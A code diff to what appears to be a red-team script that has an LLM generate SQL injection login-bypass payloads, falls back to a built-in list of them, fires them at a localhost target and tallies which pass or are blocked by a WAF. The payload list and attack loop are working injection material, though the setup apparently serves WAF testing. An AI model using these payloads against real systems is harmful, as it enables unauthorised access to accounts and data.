@@ -25,19 +25,19 @@ from openai import OpenAI
 # Config
 # ---------------------------------------------------------------------------
 ALLOWED_HOSTS = {"127.0.0.1", "localhost"}
-DEFAULT_TARGET = "http://127.0.0.1:5001"
+DEFAULT_TARGET = "http://127.0.0.1:8080"
 LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "attack_log.json")
 
 # Load .env from the project root (one level up from red-ai/)
 load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".env"))
 
 
-def get_llm_client() -> OpenAI:
+def get_llm_client() -> OpenAI | None:
     """Initialise the Nebius AI Studio client via the OpenAI-compatible SDK."""
     api_key = os.environ.get("NEBIUS_API_KEY")
     if not api_key:
-        print("ERROR: NEBIUS_API_KEY not set. Add it to ../.env or export it.")
-        sys.exit(1)
+        print("NOTICE: NEBIUS_API_KEY not set in .env — using built-in attack payloads.")
+        return None
     return OpenAI(
         base_url="https://api.studio.nebius.com/v1/",
         api_key=api_key,
@@ -76,7 +76,7 @@ Return ONLY a JSON array of these objects — no explanation, no markdown fences
 """
 
 
-def generate_payloads(client: OpenAI, model: str) -> list[dict]:
+def generate_payloads(client: OpenAI | None, model: str) -> list[dict]:
     """Ask the LLM for SQL injection payloads and parse the JSON response."""
     fallback = [
         {"username": "' OR '1'='1' --", "password": "x"},
@@ -88,6 +88,9 @@ def generate_payloads(client: OpenAI, model: str) -> list[dict]:
         {"username": "admin'/*", "password": "*/--"},
         {"username": "' OR username='admin' --", "password": "x"},
     ]
+
+    if client is None:
+        return fallback
 
     try:
         resp = client.chat.completions.create(
@@ -208,7 +211,12 @@ def main():
     results = []
     for i, payload in enumerate(payloads, 1):
         result = fire_payload(args.target, payload)
-        status = "✅ SUCCESS" if result["success"] else "❌ FAILED"
+        if result["success"]:
+            status = "✅ SUCCESS (Bypassed)"
+        elif result.get("status_code") == 403:
+            status = "🛡️  BLOCKED (WAF 403)"
+        else:
+            status = f"❌ FAILED ({result.get('status_code')})"
         print(f"  [{i}/{len(payloads)}] {status}  →  username={payload.get('username', '')!r}")
         results.append(result)
         time.sleep(0.2)  # polite pause
@@ -219,14 +227,16 @@ def main():
 
     total = len(results)
     wins = [r for r in results if r["success"]]
-    losses = total - len(wins)
+    blocked = [r for r in results if r.get("status_code") == 403]
+    other_failures = total - len(wins) - len(blocked)
 
     print("\n" + "=" * 60)
     print("  SUMMARY")
     print("=" * 60)
     print(f"  Payloads tried   : {total}")
-    print(f"  Payloads SUCCESS : {len(wins)}")
-    print(f"  Payloads FAILED  : {losses}")
+    print(f"  Payloads SUCCESS : {len(wins)} (Bypassed WAF to app)")
+    print(f"  Payloads BLOCKED : {len(blocked)} (Intercepted by Guardian WAF)")
+    print(f"  Other Failures   : {other_failures}")
     if wins:
         print("\n  Working payloads:")
         for w in wins:
